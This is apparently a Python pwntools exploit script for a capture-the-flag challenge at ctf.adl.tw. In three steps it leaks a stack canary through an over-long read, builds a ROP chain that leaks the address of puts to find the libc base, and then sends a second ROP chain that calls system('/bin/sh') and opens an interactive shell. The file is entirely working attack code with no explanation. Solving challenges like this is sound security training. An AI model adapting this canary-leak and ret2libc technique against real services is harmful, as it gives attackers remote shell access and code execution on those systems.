from pwn import *

context.arch = 'amd64'

libc = ELF('./libc.so.6')

p = remote('ctf.adl.tw', 10006)

pop_rdi_ret = 0x4012f5
ret         = 0x40101a
puts_plt    = 0x4010e0
puts_got    = 0x404020
main_addr   = 0x40141a

# ============================================================
# Step 1
# ============================================================

p.recvuntil(b'Tell me something:\n')
p.send(b'A' * 25)

p.recvuntil(b'Child says: ')
line = p.recvline()
leak = line[25:]
canary = b'\x00' + leak[:7]
log.info(f"canary: {canary.hex()}")

# ============================================================
# Step 2
# ============================================================

payload = flat(b'A'*24, canary, b'A'*8,
               pop_rdi_ret, puts_got, puts_plt, main_addr)
p.recvuntil(b'Tell me something:\n')
p.send(payload)

p.recvuntil(b'Goodbye!\n')
line = p.recvline()
leaked_puts = u64(line.rstrip(b'\n').ljust(8, b'\x00'))
libc_base = leaked_puts - libc.symbols['puts']
log.success(f"libc base: {hex(libc_base)}")

system_addr = libc_base + libc.symbols['system']
binsh_addr  = libc_base + next(libc.search(b'/bin/sh\x00'))

# ============================================================
# Step 3
# ============================================================

p.recvuntil(b'Tell me something:\n')
p.send(b'A' * 25)

payload2 = flat(b'A'*24, canary, b'A'*8,
                ret, pop_rdi_ret, binsh_addr, system_addr)
p.recvuntil(b'Tell me something:\n')
p.send(payload2)

p.interactive()


